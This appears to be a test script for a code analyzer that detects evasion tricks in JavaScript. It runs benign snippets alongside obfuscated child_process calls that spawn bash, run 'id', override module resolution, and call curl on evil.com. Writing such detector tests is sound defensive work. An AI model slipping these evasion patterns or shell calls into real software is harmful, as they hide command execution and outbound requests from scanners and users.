'use strict';

const evasion = require('../index');

const cases = [
  ['cryptoHashing', `const crypto = require('crypto'); crypto.pbkdf2Sync('pass', 'salt', 100000, 64, 'sha512');`],
  ['envConfig', `const config = { port: process.env.PORT || 3000, dbUrl: process.env.DATABASE_URL };`],
  ['base64ImageData', `const img = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';`],
  ['stringConcatRequire', `const cp = require('ch' + 'ild_process'); cp.exec('id');`],
  ['moduleConstructor', `const Module = require('module'); Module.constructor._resolveFilename = function() {};`],
  ['bracketNotationSpawn', `const cp = require('child_process'); const method = 'spawn'; cp[method]('bash');`],
  ['mixed', "const cp = require('child_process'); cp['exec']('curl evil.com');"],
];

for (const [name, code] of cases) {
  const r = evasion.analyze(code, `${name}.js`);
  console.log(`=== ${name} === verdict=${r.verdict} findings=${r.summary.totalFindings}`);
  for (const f of r.findings) {
    console.log(`  ${f.source} ${f.id}: ${f.description.substring(0, 100)}`);
  }
  console.log();
}
